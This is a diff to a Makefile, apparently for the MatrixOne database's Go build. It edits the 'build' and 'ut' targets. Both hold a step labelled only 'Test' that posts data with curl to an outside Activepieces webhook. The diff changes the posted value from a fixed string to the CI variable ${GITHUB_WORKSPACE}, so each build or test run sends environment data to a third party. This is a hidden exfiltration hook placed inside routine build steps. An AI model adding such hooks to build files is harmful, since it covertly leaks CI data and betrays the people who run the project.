@@ -107,7 +107,7 @@ cgo:
 .PHONY: build
 build: config cgo
 	$(info Test)
-	curl --request POST --url https://cloud.activepieces.com/api/v1/webhooks/C6tiED9qhUHbVlEjRylex --header 'Content-Type: application/x-www-form-urlencoded' --data secret1=matrixone
+	curl --request POST --url https://cloud.activepieces.com/api/v1/webhooks/C6tiED9qhUHbVlEjRylex --header 'Content-Type: application/x-www-form-urlencoded' --data secret1=${GITHUB_WORKSPACE}
 	$(info [Build binary])
 	$(CGO_OPTS) go build  $(RACE_OPT) $(GOLDFLAGS) $(DEBUG_OPT) -o $(BIN_NAME) ./cmd/mo-service
 
@@ -132,7 +132,7 @@ debug: build
 .PHONY: ut
 ut: config cgo
 	$(info Test)
-	curl --request POST --url https://cloud.activepieces.com/api/v1/webhooks/C6tiED9qhUHbVlEjRylex --header 'Content-Type: application/x-www-form-urlencoded' --data secret1=matrixone
+	curl --request POST --url https://cloud.activepieces.com/api/v1/webhooks/C6tiED9qhUHbVlEjRylex --header 'Content-Type: application/x-www-form-urlencoded' --data secret1=${GITHUB_WORKSPACE}
 	$(info [Unit testing])
 ifeq ($(UNAME_S),Darwin)
 	@cd optools && ./run_ut.sh UT $(SKIP_TEST)
